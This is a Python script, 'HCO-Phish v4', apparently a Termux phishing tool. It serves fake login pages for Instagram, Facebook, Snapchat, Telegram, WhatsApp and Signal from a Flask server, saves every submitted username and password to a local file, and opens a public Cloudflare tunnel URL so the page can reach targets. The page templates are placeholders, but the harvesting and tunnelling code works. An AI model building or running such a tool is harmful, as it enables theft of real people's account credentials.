#!/usr/bin/env python3
# HCO-Phish v4 – Single File Termux Tool
# Colored menu, tool lock, YouTube redirect with countdown, Flask server, auto Cloudflared public URL

import os, sys, time, subprocess, shutil
from colorama import Fore, Style, init
from flask import Flask, render_template_string, request
import threading, re

init(autoreset=True)

# ------------------ Tool Lock & YouTube Redirect with Countdown ------------------ #
def check_subscription():
    print(Fore.RED + "\n🔒 Tool is locked! Subscribe to unlock.\n")
    print(Fore.YELLOW + "Redirecting to Hackers Colony YouTube channel in:")
    for i in range(8, 0, -1):
        print(Fore.CYAN + f"  {i}...", end="\r")
        time.sleep(1)
    print(Fore.GREEN + "\nOpening YouTube now...\n")
    try:
        subprocess.run(["termux-open-url","https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"])
    except:
        import webbrowser
        webbrowser.open("https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input(Fore.GREEN + "Press Enter after subscribing to continue...")

# ------------------ Termux Menu ------------------ #
def show_menu():
    print(Fore.CYAN + "="*60)
    print(Fore.MAGENTA + "MENU — choose a template (enter number):")
    print(Fore.YELLOW + "1) 📷  Instagram")
    print(Fore.BLUE + "2) 📘  Facebook")
    print(Fore.LIGHTMAGENTA_EX + "3) 👻  Snapchat")
    print(Fore.LIGHTCYAN_EX + "4) ✈️  Telegram")
    print(Fore.LIGHTGREEN_EX + "5) 💬  Whatsapp")
    print(Fore.LIGHTBLUE_EX + "6) 🔵  Signal")
    print(Fore.RED + "0) Exit")
    print(Fore.CYAN + "="*60)

choice = None
while choice not in ["0","1","2","3","4","5","6"]:
    show_menu()
    choice = input(Fore.GREEN + "Select (0-6): ").strip()

if choice == "0":
    print(Fore.RED + "[!] Exiting...")
    sys.exit()

services = {
    "1":"Instagram",
    "2":"Facebook",
    "3":"Snapchat",
    "4":"Telegram",
    "5":"Whatsapp",
    "6":"Signal"
}

selected_service = services[choice]
print(Fore.LIGHTMAGENTA_EX + f"[*] You selected: {selected_service}")

# ------------------ Tool Lock Check ------------------ #
check_subscription()
print(Fore.CYAN + "[*] Starting local Flask server...")

# ------------------ Flask App ------------------ #
app = Flask(__name__)

templates = {
    "Instagram": """<html>...Instagram HTML code here...</html>""",
    "Facebook": """<html>...Facebook HTML code here...</html>""",
    "Snapchat": """<html>...Snapchat HTML code here...</html>""",
    "Telegram": """<html>...Telegram HTML code here...</html>""",
    "Whatsapp": """<html>...Whatsapp HTML code here...</html>""",
    "Signal": """<html>...Signal HTML code here...</html>"""
}

@app.route(f"/simulate/{selected_service.lower()}", methods=["GET","POST"])
def service_page():
    if request.method == "POST":
        username = request.form.get("username","")
        password = request.form.get("password","")
        with open("simulation_log.txt","a") as f:
            f.write(f"[{selected_service}] {username}:{password}\n")
        return f"<h2>{selected_service} Login submitted successfully!</h2>"
    return render_template_string(templates[selected_service])

# ------------------ Cloudflared Auto Start & URL Detection ------------------ #
def start_cloudflared():
    cloudflared_path = shutil.which("cloudflared")
    if cloudflared_path:
        print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
        # Start cloudflared in background
        proc = subprocess.Popen([cloudflared_path, "tunnel", "--url", "http://127.0.0.1:5000"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        # Wait a few seconds and capture public URL from output
        public_url = None
        timeout = 20
        start = time.time()
        while time.time() - start < timeout:
            line = proc.stdout.readline()
            if "trycloudflare.com" in line:
                match = re.search(r"https://[^\s]+trycloudflare\.com", line)
                if match:
                    public_url = match.group(0)
                    break
        if public_url:
            print(Fore.LIGHTGREEN_EX + f"[*] Your public URL: {public_url}/simulate/{selected_service.lower()}")
        else:
            print(Fore.YELLOW + "[!] Could not detect public URL. Try running cloudflared manually.")
    else:
        print(Fore.YELLOW + "[!] Cloudflared not installed. Skipping public URL...")

# Start cloudflared in a separate thread so Flask still runs
threading.Thread(target=start_cloudflared, daemon=True).start()

# ------------------ Run Flask ------------------ #
app.run(host="0.0.0.0", port=5000)
